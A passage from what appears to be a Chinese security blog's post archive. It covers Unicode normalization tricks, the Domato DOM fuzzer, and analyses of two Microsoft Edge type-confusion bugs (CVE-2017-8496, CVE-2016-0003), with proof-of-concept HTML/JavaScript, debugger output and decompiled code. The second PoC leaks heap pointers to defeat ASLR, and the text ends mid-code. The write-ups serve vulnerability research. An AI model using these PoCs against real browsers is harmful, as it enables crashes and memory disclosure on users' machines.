但是这个答案还不够清晰，于是继续顺着线索找到unicode转换的标准。标准中提到，两个不同编码的Unicode字符可能存在一定的等价性，这种等价是字符或字符序列之间比较弱的等价类型，这些变体形式可能代表在某些字体或语境中存在视觉上或意义上的相似性。举例来说，a 和ａ(\\uff41)在某些字体下看起来可能相同，15和⑮(\\u246e)其表示的数学意义可能相同，所以这两种字符都有其相应的等价性，这种等价性是由人为规定的。更具体的说明可以参考wiki。 转换组成字符的方式有 Normalization Form C 和 Normalization Form KC 两种，它们之间的区别取决于生成的文本是否与原始非标准化文本等效，其中K用于表示兼容性。同理，分解组成字符的方式也有Normalization Form D 和 Normalization Form KD 两种。那么NFC和NFD的区别是什么呢，举例来说，Å(\\u212B)用NFD进行normalize，会变为Å(\\u0041\\u030a)，而NFC处理后则是Å(\\u00c5)。在normalize的时候，会检测字符是否在NFC表中，如果在则进行对应的转换算法。回到之前的问题，\\uff41会被normalize，而\\u0430不被normalize，在请求时因为其中包含unicode字符，所以会被认为是IDN域名。 到此为止，开头的问题已经基本清楚了。在接下来，想构造字符对应的等效码表，来为平时的测试服务。以简单考虑，这里不对icu的代码做深究，一个简单的想法是，对所有字符遍历一次，寻找normalize后相等的字符即可。那么一个简单的获取可打印ascii字符的等效字符的脚本如下： 1234567891011121314151617181920212223242526272829303132#!/usr/bin/env python# -*- coding: utf-8 -*-import jsonfrom unicodedata import normalizedef main(): debug = False tables = &#123;&#125; for i in range(1, 0x10000): src = unichr(i) dst = normalize('NFKC', src)[0] try: if ord(dst) &lt; 128 and dst != src: if debug: print(\"%s (\\\\u%s) -- normalize --&gt; %s (\\\\x%s)\" % ( src, hex(i)[2:].rjust(4, '0'), dst, hex(dst.charAt(0))[2:] )) if dst in tables: tables[dst].append(src) else: tables[dst] = [src] except Exception as e: print(repr(e)) with open(\"nfctable.txt\", \"wb\") as fh: json.dump(tables, fh)if __name__ == '__main__': main()","categories":[],"tags":[]},{"title":"Domato - A DOM Fuzzer","slug":"2017-9-27-domato-dom-fuzzer","date":"2017-09-27T01:31:40.000Z","updated":"2018-11-27T01:56:09.108Z","comments":true,"path":"2017/09/27/2017-9-27-domato-dom-fuzzer/","link":"","permalink":"https://LyleMi.github.io/2017/09/27/2017-9-27-domato-dom-fuzzer/","excerpt":"0x00 概述Domato是Google Project Zero的研究员实现的一套DOM Fuzz工具，该Fuzzer挖掘出了30+来自各浏览器的漏洞，是一款比较高效的Fuzzer。 其基本思路和正常的fuzzer一样，也是利用从各个地方抓取的HTML/CSS/JS样本中所包含的语法结构和属性来生成样本。 整个fuzzer大概可以分为以下几个部分： generator.py 根据输入的语法生成样本的引擎 grammar.py 解析参数然后调用基础引擎来生成样本 *.txt 用于生成HTML，CSS，js代码的语法库","text":"0x00 概述Domato是Google Project Zero的研究员实现的一套DOM Fuzz工具，该Fuzzer挖掘出了30+来自各浏览器的漏洞，是一款比较高效的Fuzzer。 其基本思路和正常的fuzzer一样，也是利用从各个地方抓取的HTML/CSS/JS样本中所包含的语法结构和属性来生成样本。 整个fuzzer大概可以分为以下几个部分： generator.py 根据输入的语法生成样本的引擎 grammar.py 解析参数然后调用基础引擎来生成样本 *.txt 用于生成HTML，CSS，js代码的语法库 0x01 代码代码主要完成根据语法生成代码的功能，主要的代码是generator.py和grammar.py，另外的都是语法文件。 语法语法文件是domato的一个重要的部分，这部分作者提到的产生方式为两步。首先从Chrome的源文件中抽取出.idl文件，然后从Chrome的测试文件中提取出了一些常见的HTML和CSS语法。在提取出这些属性之后，还有很大范围的人工的改动，使得这些特征更容易触发bug。 完成后，作者并没有使用常见的json或者xml来定义，而是自己自定义了一种语法格式。其基本的语法是这样的： 1&lt;symbol&gt; = a mix of constants and &lt;other_symbol&gt;s 每一条语法规则都包含一个左值和一个右值，左值是一个符号，右值是符号/常量及其组合。在生成样本时，右值都会递归的展开。 一个最简单的例子如下 1234&lt;cssrule&gt; = &lt;selector&gt; &#123; &lt;declaration&gt; &#125;&lt;selector&gt; = a&lt;selector&gt; = b&lt;declaration&gt; = width:100% 这里可能生成的样本就是 a { width:100% } 或者 b { width:100% } 这里在定义symbol的同时还可以定义一些附加的属性，比如 12&lt;selector p=0.9&gt; = a&lt;selector p=0.1&gt; = b 这里表示a出现的概率为0.1，如果不特别声明，则概率是相差不多的 代码语法用于生成代码的语法和普通的语法相差不大，但是引入了更多的规则来使得可以生成更灵活的脚本。还是看作者给出的例子 1234567!varformat fuzzvar%05d!lineguard try &#123; &lt;line&gt; &#125; catch(e) &#123;&#125;!begin lines&lt;new element&gt; = document.getElementById(&quot;&lt;string min=97 max=122&gt;&quot;);&lt;element&gt;.doSomething();!end lines 调用脚本生成一个5行的样本，得到的结果为 12345try &#123; var00001 = document.getElementById(\"hw\"); &#125; catch(e) &#123;&#125;try &#123; var00001.doSomething(); &#125; catch(e) &#123;&#125;try &#123; var00002 = document.getElementById(\"feezcqbndf\"); &#125; catch(e) &#123;&#125;try &#123; var00002.doSomething(); &#125; catch(e) &#123;&#125;try &#123; var00001.doSomething(); &#125; catch(e) &#123;&#125; 写一个代码的语法规则要注意的是下面这些点： 每一行都由!begin lines和!end lines包裹 这里用了&lt;new element&gt;而不是&lt;element&gt;，表示生成了一个变量 generator.pygenerator.py是主文件，其调用了grammar.py作为库，另外包含一些辅助生成样本的函数，大概的逻辑流程如下： GenerateSamples read template and grammar files add html grammar =&gt; html.txt import css grammar add js grammar =&gt; js.txt import css grammar add css grammar =&gt; css.txt GenerateNewSample with args (template html css js) AddHTMLIDs =&gt; 随机生成一些html元素的id，用于js/css GenerateHTMLElements =&gt; 调用库生成html及css，保存相关信息 GenerateFunctionBody =&gt; 根据之前保存的信息生成js代码 grammar.pygrammar.py实现了一个通用的语法库，也就是说除了该fuzzer，还适用于其他的生成的库。其大概流程如下： ParseFromString =&gt; 读取文件 IncludeFromString =&gt; 保存规则 SaveFunction ParseCodeLine ParseGrammarLine ParseTagAndAttributes NormalizeProbabilities =&gt; 根据概率随机生成样本 GetCDF ComputeInterestingIndices 其调用也比较简单，一个简单的demo如下 12345from grammar import Grammarmy_grammar = Grammar()my_grammar.ParseFromFile('input_file.txt')result_string = my_grammar.GenerateSymbol('symbol_name') 这里就调用input_file.txt中的语法生成了symbol_name中的元素 0x02 参考链接 pj0 blog github","categories":[{"name":"browser fuzz","slug":"browser-fuzz","permalink":"https://LyleMi.github.io/categories/browser-fuzz/"}],"tags":[]},{"title":"CVE-2017-8496 Edge Type confusion","slug":"2017-8-14-cve-2017-8496","date":"2017-08-14T01:31:40.000Z","updated":"2018-11-27T01:56:00.171Z","comments":true,"path":"2017/08/14/2017-8-14-cve-2017-8496/","link":"","permalink":"https://LyleMi.github.io/2017/08/14/2017-8-14-cve-2017-8496/","excerpt":"1. Vulnerability Description1.1 The Issue崩溃发生在CAttrArray::PrivateFindInl函数中。 在函数中rcx（this）指针应该指向一个CAttrArray，但它实际上指向一个CAttribute。CAttrArray::PrivateFindInl只会执行读取操作，其返回值将被调用函数（CAttrArray::SetParsed）抛弃。","text":"1. Vulnerability Description1.1 The Issue崩溃发生在CAttrArray::PrivateFindInl函数中。 在函数中rcx（this）指针应该指向一个CAttrArray，但它实际上指向一个CAttribute。CAttrArray::PrivateFindInl只会执行读取操作，其返回值将被调用函数（CAttrArray::SetParsed）抛弃。 1.2 Affect versionWindows 10 Enterprise 64-bit (OS version 1607, OS build 14393.1198)Microsoft Edge 38.14393.1066.0, Microsoft EdgeHTML 14.14393. 1.3 Timeline01/12/2016 Advisory disclosed01/12/2016 +0 days Countermeasure disclosed01/12/2016 +0 days SecurityTracker entry created01/12/2016 +0 days VulnerabilityCenter entry assigned01/13/2016 +1 days VulnerabilityCenter entry created01/14/2016 +1 days VulDB entry created01/17/2016 +3 days VulnerabilityCenter entry updated01/19/2016 +2 days VulDB last update 2. Technical description and PoC2.1 Crash从Google Project Zero的报告中获取的PoC如下 123456789&lt;!-- saved from url=(0014)about:internet --&gt;&lt;script&gt;function go() &#123; window.addEventListener(\"DOMAttrModified\", undefined); m.style.cssText = \"clip-path: url(#foo);\";&#125;&lt;/script&gt;&lt;body onload=go()&gt;&lt;meter id=\"m\" value=\"a\" frame=\"below\"&gt; WinDBG attach到Edge上，运行PoC，发现Crash（注：这里用了一款Edge专用的辅助Debug的工具，可以比较方便的在命令行直接attach到进程上。） 12edgehtml!CAttrArray::PrivateFindInl+0xd6:00007ffa`3b9e04b6 41f644d00380 test byte ptr [r8+rdx*8+3],80h ds:00000003`0005ffbe=?? 可以看出，这里是引用了一个无效的指针，此时的调用栈如下 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960611:048&gt; k # Child-SP RetAddr Call Site00 00000013`84bfad60 00007ffa`3bbaccc9 edgehtml!CAttrArray::PrivateFindInl+0xd601 00000013`84bfad90 00007ffa`3bb1a68b edgehtml!CAttrArray::SetParsed+0x4902 00000013`84bfae00 00007ffa`3bb1c40c edgehtml!CssParser::RecordProperty+0x24b03 00000013`84bfae70 00007ffa`3bb1b10c edgehtml!CssParser::HandleSingleDeclaration+0x21c04 00000013`84bfaef0 00007ffa`3bae026b edgehtml!CssParser::HandleDeclaration+0x9c05 00000013`84bfaf20 00007ffa`3badedaa edgehtml!CssParser::Write+0x3b06 00000013`84bfaf60 00007ffa`3b93165c edgehtml!ProcessCSSText+0x11207 00000013`84bfafe0 00007ffa`3b94aae3 edgehtml!CStyle::SetCssText+0xbc08 00000013`84bfb020 00007ffa`3bc2ed85 edgehtml!CFastDOM::CCSSStyleDeclaration::Trampoline_Set_cssText+0x7709 00000013`84bfb070 00007ffa`3af6c35b edgehtml!CFastDOM::CCSSStyleDeclaration::Profiler_Set_cssText+0x250a 00000013`84bfb0a0 00007ffa`3af34460 chakra!Js::JavascriptExternalFunction::ExternalFunctionThunk+0x16b0b 00000013`84bfb180 00007ffa`3aed6d09 chakra!Js::LeaveScriptObject&lt;1,1,0&gt;::LeaveScriptObject&lt;1,1,0&gt;+0x1800c 00000013`84bfb1d0 00007ffa`3aed44ae chakra!Js::JavascriptOperators::CallSetter+0xa90d 00000013`84bfb270 00007ffa`3aed4be2 chakra!Js::JavascriptOperators::SetProperty_Internal&lt;0&gt;+0x4de0e 00000013`84bfb330 00007ffa`3aed4b1f chakra!Js::JavascriptOperators::OP_SetProperty+0xa20f 00000013`84bfb380 00007ffa`3af8c1fb chakra!Js::JavascriptOperators::PatchPutValueWithThisPtrNoFastPath+0x9f10 00000013`84bfb400 00007ffa`3aec1ca0 chakra!Js::ProfilingHelpers::ProfiledStFld&lt;0&gt;+0x1cb11 00000013`84bfb4d0 00007ffa`3aec6a50 chakra!Js::InterpreterStackFrame::OP_ProfiledSetProperty&lt;Js::OpLayoutT_ElementCP&lt;Js::LayoutSizePolicy&lt;0&gt; &gt; const &gt;+0x7012 00000013`84bfb520 00007ffa`3aec4aa2 chakra!Js::InterpreterStackFrame::ProcessProfiled+0x34013 00000013`84bfb5b0 00007ffa`3aec8b5e chakra!Js::InterpreterStackFrame::Process+0x14214 00000013`84bfb610 00007ffa`3aeca265 chakra!Js::InterpreterStackFrame::InterpreterHelper+0x48e15 00000013`84bfb950 00000176`dcdc0fb2 chakra!Js::InterpreterStackFrame::InterpreterThunk+0x5516 00000013`84bfb9a0 00007ffa`3aff1393 0x00000176`dcdc0fb217 00000013`84bfb9d0 00007ffa`3aebd873 chakra!amd64_CallFunction+0x9318 00000013`84bfba20 00007ffa`3aec0490 chakra!Js::JavascriptFunction::CallFunction&lt;1&gt;+0x8319 00000013`84bfba80 00007ffa`3aec4f4d chakra!Js::InterpreterStackFrame::OP_CallI&lt;Js::OpLayoutDynamicProfile&lt;Js::OpLayoutT_CallI&lt;Js::LayoutSizePolicy&lt;0&gt; &gt; &gt; &gt;+0x1101a 00000013`84bfbad0 00007ffa`3aec4b07 chakra!Js::InterpreterStackFrame::ProcessUnprofiled+0x32d1b 00000013`84bfbb60 00007ffa`3aec8b5e chakra!Js::InterpreterStackFrame::Process+0x1a71c 00000013`84bfbbc0 00007ffa`3aeca265 chakra!Js::InterpreterStackFrame::InterpreterHelper+0x48e1d 00000013`84bfbf00 00000176`dcdc0fba chakra!Js::InterpreterStackFrame::InterpreterThunk+0x551e 00000013`84bfbf50 00007ffa`3aff1393 0x00000176`dcdc0fba1f 00000013`84bfbf80 00007ffa`3aebd873 chakra!amd64_CallFunction+0x9320 00000013`84bfbfd0 00007ffa`3af2c2ec chakra!Js::JavascriptFunction::CallFunction&lt;1&gt;+0x8321 00000013`84bfc030 00007ffa`3af2b8b6 chakra!Js::JavascriptFunction::CallRootFunctionInternal+0x10422 00000013`84bfc120 00007ffa`3afd6259 chakra!Js::JavascriptFunction::CallRootFunction+0x4a23 00000013`84bfc190 00007ffa`3af31d41 chakra!ScriptSite::CallRootFunction+0xb524 00000013`84bfc230 00007ffa`3af2d8fc chakra!ScriptSite::Execute+0x13125 00000013`84bfc2c0 00007ffa`3bb3278d chakra!ScriptEngineBase::Execute+0xcc26 00000013`84bfc360 00007ffa`3bb326d8 edgehtml!CJScript9Holder::ExecuteCallbackDirect+0x3d27 00000013`84bfc3b0 00007ffa`3bb431f7 edgehtml!CJScript9Holder::ExecuteCallback+0x1828 00000013`84bfc3f0 00007ffa`3bb42fe7 edgehtml!CListenerDispatch::InvokeVar+0x1fb29 00000013`84bfc570 00007ffa`3bb310da edgehtml!CListenerDispatch::Invoke+0xdb2a 00000013`84bfc5f0 00007ffa`3bbc1602 edgehtml!CEventMgr::_InvokeListeners+0x2ca2b 00000013`84bfc750 00007ffa`3ba9a495 edgehtml!CEventMgr::_InvokeListenersOnWindow+0x662c 00000013`84bfc780 00007ffa`3ba99f23 edgehtml!CEventMgr::Dispatch+0x4052d 00000013`84bfca50 00007ffa`3bad00c2 edgehtml!CEventMgr::DispatchEvent+0x732e 00000013`84bfcaa0 00007ffa`3bb0296a edgehtml!COmWindowProxy::Fire_onload+0x14e2f 00000013`84bfcbb0 00007ffa`3bb01596 edgehtml!CMarkup::OnLoadStatusDone+0x37630 00000013`84bfcc70 00007ffa`3bb46d7f edgehtml!CMarkup::OnLoadStatus+0x11231 00000013`84bfcca0 00007ffa`3bb2859d edgehtml!CProgSink::DoUpdate+0x3af32 00000013`84bfd130 00007ffa`3bb29d70 edgehtml!GlobalWndOnMethodCall+0x24d33 00000013`84bfd230 00007ffa`593e1c24 edgehtml!GlobalWndProc+0x13034 00000013`84bfd2f0 00007ffa`593e156c user32!UserCallWinProcCheckWow+0x27435 00000013`84bfd450 00007ffa`380ec781 user32!DispatchMessageWorker+0x1ac36 00000013`84bfd4d0 00007ffa`380eec41 EdgeContent!CBrowserTab::_TabWindowThreadProc+0x4a137 00000013`84bff720 00007ffa`4f7b9266 EdgeContent!LCIETab_ThreadProc+0x2c138 00000013`84bff840 00007ffa`59d98364 iertutil!SettingStore::CSettingsBroker::SetValue+0x24639 00000013`84bff870 00007ffa`59f55e91 KERNEL32!BaseThreadInitThunk+0x143a 00000013`84bff8a0 00000000`00000000 ntdll!RtlUserThreadStart+0x21 寄存器的值如下 1234567891:048&gt; rrax=0000000000003ffd rbx=0000000000000002 rcx=00000176d9804cf0rdx=000000000000bff7 rsi=0000000000003ffd rdi=0000000000000000rip=00007ffa3b9e04b6 rsp=0000001384bfad60 rbp=0000000000000002 r8=0000000300000003 r9=00000000800114a4 r10=0000000000000000r11=0000000000007ffa r12=00000176d9a9c680 r13=00000176d9734b01r14=00000176d9804c88 r15=0000000000000000iopl=0 nv up ei pl nz na pe nccs=0033 ss=002b ds=002b es=002b fs=0053 gs=002b efl=00010202 在ida中查看相关的代码: 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139int __fastcall CAttrArray::PrivateFindInl(__int64 this, int a2, signed int CAttrValue__AATYPE)&#123; signed int v3; // edi@1 signed int v4; // er10@1 int v5; // er9@1 __int64 this_add_4; // r11@4 __int64 this_add_8; // r8@4 signed int v8; // ebx@4 unsigned __int64 v9; // rax@7 signed __int64 v10; // rdx@7 unsigned __int64 v11; // r11@8 int v12; // ecx@10 signed int v13; // ecx@16 __int64 v14; // rsi@22 int v15; // ecx@23 signed int v16; // ecx@34 signed int v17; // esi@38 signed __int64 v18; // rdx@38 int v19; // ecx@40 int v21; // [sp+38h] [bp+10h]@20 v3 = 0; v4 = CAttrValue__AATYPE; v5 = a2; if ( CAttrValue__AATYPE == 6 ) v4 = 0; if ( a2 == -1 ) &#123; v21 = -1; LODWORD(v9) = CAttrArray::PrivateFindLinear(this, (unsigned int)v4, &amp;v21, 0xFFFFFFFFi64); &#125; else &#123; this_add_4 = *(_DWORD *)(this + 4); this_add_8 = *(_QWORD *)(this + 8); v8 = 2; if ( v4 &gt; 2 ) v8 = v4; if ( (signed int)this_add_4 &lt; 11 ) &#123; v9 = *(_QWORD *)(this + 8); v10 = 3 * this_add_4; goto LABEL_8; &#125; if ( (signed int)this_add_4 &gt; 0 ) &#123; while ( 1 ) &#123; v14 = ((signed int)this_add_4 + v3) / 2; v9 = this_add_8 + 24 * v14; if ( *(_BYTE *)(this_add_8 + 24 * v14 + 3) &amp; 0x80 )// vuln v15 = *(_DWORD *)(v9 + 8); else v15 = *(_DWORD *)(*(_QWORD *)(v9 + 8) + 48i64); if ( a2 &lt; v15 ) &#123; LODWORD(this_add_4) = ((signed int)this_add_4 + v3) / 2; goto LABEL_26; &#125; if ( a2 &gt; v15 ) goto LABEL_30; v16 = *(_BYTE *)v9; if ( v4 == v16 ) return v9; if ( v8 &gt;= v16 ) break; LODWORD(this_add_4) = ((signed int)this_add_4 + v3) / 2;LABEL_26: if ( (signed int)this_add_4 - v3 &lt; 10 ) &#123; v9 = this_add_8 + 24i64 * v3; goto LABEL_28; &#125; if ( v3 &gt;= (signed int)this_add_4 ) goto LABEL_19; &#125; if ( v8 == 2i64 ) &#123; v17 = v14 - 1; v18 = v9 - 24; if ( v17 &gt;= v3 ) &#123; while ( 1 ) &#123; v19 = *(_BYTE *)(v18 + 3) &amp; 0x80 ? *(_DWORD *)(v18 + 8) : *(_DWORD *)(*(_QWORD *)(v18 + 8) + 48i64); if ( v5 != v19 ) break; if ( v4 == *(_BYTE *)v18 ) &#123; LODWORD(v9) = v18; return v9; &#125; if ( v17 != v3 ) &#123; v18 -= 24i64; if ( --v17 &gt;= v3 ) continue; &#125; break; &#125; &#125;LABEL_28: v10 = 3i64 * (signed int)this_add_4;LABEL_8: v11 = this_add_8 + 8 * v10; if ( v9 &lt; v11 ) &#123; while ( 1 ) &#123; if ( *(_BYTE *)(v9 + 3) &amp; 0x80 ) v12 = *(_DWORD *)(v9 + 8); else v12 = *(_DWORD *)(*(_QWORD *)(v9 + 8) + 48i64); if ( v12 &gt;= v5 ) &#123; if ( v12 != v5 ) goto LABEL_19; v13 = *(_BYTE *)v9; if ( v13 == v4 ) return v9; if ( v13 &gt; v8 ) goto LABEL_19; &#125; v9 += 24i64; if ( v9 &gt;= v11 ) goto LABEL_19; &#125; &#125; goto LABEL_19; &#125;LABEL_30: v3 = v14 + 1; goto LABEL_26; &#125;LABEL_19: LODWORD(v9) = 0; &#125; return v9;&#125; 其中引发问题的指令是 1if ( *(_BYTE *)(this_add_8 + 24 * v14 + 3) &amp; 0x80 ) 其中this_add_8变量对应的是 rcx+8 那么先查看下rcx的值 12345678910111213141516171:048&gt; dps rcx00000176`d9804cf0 00007ffa`3c562d38 edgehtml!CAttribute::`vftable&apos;00000176`d9804cf8 00000003`0000000300000176`d9804d00 00000000`0000000800000176`d9804d08 00000000`0000000000000176`d9804d10 00000000`0000000000000176`d9804d18 00000176`dcc1815000000176`d9804d20 00007ffa`3c55fae0 edgehtml!s_propdescCElementstyle_Str00000176`d9804d28 00000000`800103eb00000176`d9804d30 00000176`d9a742f400000176`d9804d38 00000000`0000000000000176`d9804d40 00000000`0000000000000176`d9804d48 00000000`0000000000000176`d9804d50 00000176`d982850000000176`d9804d58 00000176`d98a858000000176`d9804d60 00000176`d9850c0000000176`d9804d68 00000176`d983c330 这里rcx是this指针，在CAttrArray::PrivateFindInl这个类的函数中应该是一个CAttrArray对象的this指针，可是这里rcx存了一个CAttribute的虚表对象，也就是说，在之前有一个错误的调用。 那么根据调用栈继续上溯，我们可以看到CAttrArray::SetParsed函数，调用PrivateFindInl的代码如下 123456if ( v6 || (v8 = *a1) == 0i64 || (LODWORD(v9) = CAttrArray::PrivateFindInl((__int64)v8, a2, 0), !v9) )&#123; v11 = v4; v10 = 31; CAttrArray::Set(v7, (unsigned int)v5, &amp;v10, 0i64);&#125; 也就是说这里如果该函数返回错误的值，那么CAttrArray::Set将不会执行。 继续向上回溯，查看CssParser::RecordProperty函数 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167void __fastcall CssParser::RecordProperty(CssParser *this, struct CssTokenizer *a2, __int32 a3, char a4, bool a5)&#123; char v5; // si@1 __int32 v6; // edi@1 struct CssTokenizer *v7; // r14@1 CssParser *v8; // rbp@1 CBase *v9; // rcx@3 char v10; // bl@4 bool v11; // r15@4 bool v12; // al@6 char v13; // r13@9 unsigned __int8 v14; // bl@10 MemoryProtection *v15; // rsi@11 const unsigned __int16 *v16; // r12@11 __int32 v17; // er8@13 __int64 v18; // rcx@18 const unsigned __int16 *v19; // rdi@18 unsigned __int64 v20; // rsi@18 __int64 v21; // rax@18 __int16 v22; // ax@24 unsigned __int64 v23; // r14@30 signed __int64 v24; // r14@31 const struct PROPERTYDESC *v25; // rax@37 int v26; // er10@37 CDoc *v27; // rax@44 const unsigned __int16 *v28; // rdx@51 unsigned __int16 *v29[2]; // [sp+20h] [bp-48h]@4 __int64 v30; // [sp+30h] [bp-38h]@4 __int32 v31; // [sp+80h] [bp+18h]@1 v31 = a3; v5 = a4; v6 = a3; v7 = a2; v8 = this; if ( *((_UNKNOWN **)this + 22) == &amp;CCSSStyleDeclaration::s_apHdlDescs &amp;&amp; *((_QWORD *)this + 2) ) &#123; v9 = (CBase *)*((_QWORD *)this + 23); if ( !v9 ) &#123;LABEL_4: v10 = 0; v30 = 0i64; _mm_storeu_si128((__m128i *)v29, 0i64); v11 = v6 == -1; v12 = v5 || v11; if ( a5 || v12 ) &#123; v13 = 1; if ( v12 ) v10 = -128; &#125; else &#123; v13 = 0; &#125; v14 = v10 | 8; if ( !v13 ) &#123;LABEL_11: v15 = (MemoryProtection *)v29[0]; v16 = &amp;g_szEmpty; if ( v11 ) &#123; if ( v29[0] ) v28 = v29[0]; else v28 = &amp;g_szEmpty; if ( CssParser::GetExpandoDispID(v8, v28, &amp;v31) ) &#123;LABEL_15: if ( v15 ) MemoryProtection::HeapFree(v15, (void *)a2); return; &#125; v6 = v31; &#125; if ( v6 != -1 ) &#123; v17 = *((_DWORD *)v8 + 7) + 1; if ( (unsigned int)v17 &gt; *((_DWORD *)v8 + 6) &gt;&gt; 2 ) &#123; if ( v17 &lt; 0 ) &#123; Abandonment::InvalidArguments(); JUMPOUT(*(_QWORD *)&amp;byte_18042A78B); &#125; CImplAry::EnsureSizeWorker((CssParser *)((char *)v8 + 24), 4ui64, v17); &#125; *(_DWORD *)(*((_QWORD *)v8 + 4) + 4i64 * (*((_DWORD *)v8 + 7))++) = v6; if ( v13 ) &#123; if ( v11 ) &#123; CAttrArray::SetParsed(*((struct CAttrArray ***)v8 + 2), v31, &amp;pwzURI, v14); &#125; else &#123; v25 = GetStandardPropDescFromAliasDISPID(v31); if ( v25 ) v26 = *((_DWORD *)v25 + 12); if ( v15 ) v16 = (const unsigned __int16 *)v15; CAttrArray::SetParsed(*((struct CAttrArray ***)v8 + 2), v26, v16, v14); &#125; &#125; &#125; goto LABEL_15; &#125; v18 = *((_QWORD *)v7 + 1); v19 = (const unsigned __int16 *)*((_QWORD *)v7 + 5); v20 = v18 + 2i64 * *((_DWORD *)v7 + 5); v21 = *((_DWORD *)v7 + 4); if ( v20 &gt; v18 + 2 * v21 ) v20 = v18 + 2 * v21; if ( !v11 ) &#123; if ( (unsigned __int64)v19 &gt;= v20 ) &#123;LABEL_31: v24 = (signed __int64)(v20 - (_QWORD)v19) &gt;&gt; 1; if ( !v11 &amp;&amp; (unsigned int)v24 &gt;= 0xA &amp;&amp; !StrCmpNICW(v20 - 20, L\"!important\", 10i64) ) &#123; LODWORD(v24) = v24 - 10; v14 |= 2u; &#125; CBuffer::Append((CBuffer *)v29, v19, v24); CBuffer::TrimTrailingWhitespace((CBuffer *)v29); v6 = v31; goto LABEL_11; &#125; if ( 58 == *v19 ) ++v19; v22 = *(_WORD *)(v20 - 2); if ( v22 == 59 || !v22 || v22 == 125 ) v20 -= 2i64; &#125; if ( (unsigned __int64)v19 &lt; v20 ) &#123; while ( IsCharSpaceW(*v19) ) &#123; ++v19; if ( (unsigned __int64)v19 &gt;= v20 ) goto LABEL_31; &#125; if ( (unsigned __int64)v19 &lt; v20 ) &#123; do &#123; v23 = v20 - 2; if ( !IsCharSpaceW(*(_WORD *)(v20 - 2)) ) break; v20 -= 2i64; &#125; while ( (unsigned __int64)v19 &lt; v23 ); &#125; &#125; goto LABEL_31; &#125; v27 = CBase::GetCDoc(v9); if ( !v27 || CDoc::CheckCSSDiagnosticsAvailability(v27) ) &#123; v6 = v31; goto LABEL_4; &#125; &#125;&#125; CAttrArray::SetParsed的调用在下面两句： 1CAttrArray::SetParsed(*((struct CAttrArray ***)v8 + 2), v31, &amp;pwzURI, v14); 1CAttrArray::SetParsed(*((struct CAttrArray ***)v8 + 2), v26, v16, v14); 这里v8是this指针，也就是说在这里发生了一次错误的调用，本来应该传入的是CAttrArray，但是传入了一个CAttribute，造成了Type confusion 3. References1. project-zero 2. nvd 3. cve 4. seebug","categories":[{"name":"cve","slug":"cve","permalink":"https://LyleMi.github.io/categories/cve/"}],"tags":[]},{"title":"CVE-2016-0003 Edge Type Confusion","slug":"2017-8-11-cve-2016-0003","date":"2017-08-11T01:31:40.000Z","updated":"2018-11-27T01:55:56.797Z","comments":true,"path":"2017/08/11/2017-8-11-cve-2016-0003/","link":"","permalink":"https://LyleMi.github.io/2017/08/11/2017-8-11-cve-2016-0003/","excerpt":"1. Vulnerability Description1.1 The IssueMS Edge CDOMTextNode::get_data type confusion 特别构造的JavaScript脚本可以触发Microsoft Edge的type confusion，使得可以像访问字符串一样访问C++对象。 这可能导致信息泄露，例如允许攻击者确定指向其他对象或函数的指针的值。","text":"1. Vulnerability Description1.1 The IssueMS Edge CDOMTextNode::get_data type confusion 特别构造的JavaScript脚本可以触发Microsoft Edge的type confusion，使得可以像访问字符串一样访问C++对象。 这可能导致信息泄露，例如允许攻击者确定指向其他对象或函数的指针的值。 1.2 Affect versionMicrosoft Edge 20.10240.16384.0 1.3 Timeline01/12/2016 Advisory disclosed01/12/2016 +0 days Countermeasure disclosed01/12/2016 +0 days SecurityTracker entry created01/12/2016 +0 days VulnerabilityCenter entry assigned01/13/2016 +1 days VulnerabilityCenter entry created01/14/2016 +1 days VulDB entry created01/17/2016 +3 days VulnerabilityCenter entry updated01/19/2016 +2 days VulDB last update 2. Technical description and PoC2.1 Description在DOM树中将一个节点作为子节点加到另一个节点时，Edge首先从其父节点中删除该节点，触发DOMNodeRemoved事件，然后重新附加该节点作为另一个节点的最后一个子节点。而在DOMNodeRemoved事件发生时，JavaScript的事件处理器可以更改DOM树，我们尝试在触发DOMNodeRemoved事件时向同一个父节点插入另一个文本子节点，这个操作在事件期间完成，因此该文本子节点在触发事件的节点之前作为子节点附加。而在触发DOMNodeRemoved事件处理程序之前，代码似乎确定了节点应该被附加的位置，因此最开始插入的节点在父文本节点之前而不是之后被插入。因为bug的存在，在完成所有这些操作后，DOM树已被破坏。这可以通过检查文本节点的.nextSibling属性是文本节点本身来确认, 即DOM树中有一个循环。另一个效果是，读取文本节点的nodeValue将导致类型混淆。这里Edge访问文本节点中存储的文本数据时，实际访问的却是一个C++对象。这样可以让攻击者读取存储在这个C++对象中的数据，其中包含各种指针。 2.2 JavaScript PoCSkylined给出了一个读取并显示DOM树对象的部分内容的PoC。该PoC已经在x64系统上进行了测试，允许攻击者绕过堆ASLR，读取堆指针。 读取的数据量可以由攻击者控制，并且可以读取分配给C++对象的内存之外的数据。攻击者可能能够使用一些堆的技巧将其他对象与C++DOM树对象中的有用信息放置在内存中，并从第二个对象读取数据。 exp如下 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778&lt;html&gt; &lt;head&gt; &lt;script&gt; var uNodeRemovedEvents = 0; onerror = function (sError, sSource, uLine)&#123; alert(sError + \" on line \" + uLine); &#125;; document.addEventListener(\"DOMNodeRemoved\", function(oEvent) &#123; if (uNodeRemovedEvents++ == 0) &#123; oTextNode = document.createTextNode(\"[2]\"); // 这里有一个需要注意的地方 // insertBefore在Edge中如果没有第二个参数，那么等同于appendChild // 但是其他浏览器是不支持的 // 作者这里用insertBefore是为了更好的去判断是否有一个堆因为此处操作被allocated // 用于和之后的appendChild调用区分开 document.body.insertBefore(oTextNode); &#125;; &#125;, true); onload = function()&#123; // onload中首先执行的是appendChild // 这里oExistingChild已经有了父节点，所以会先从父节点移除这个元素，然后把它作为新父节点的最后一个子节点 // 其中移除操作会触发DOMNodeRemoved事件，而增加操作会触发DOMNodeInserted事件。 document.body.appendChild(oExistingChild); // 但是，在oExistingChild触发DOMNodeRemoved事件时， // oTextNode插入了节点中 // 最后oExistingChild成为了最后一个元素 // 但是这里出现了一个bug // 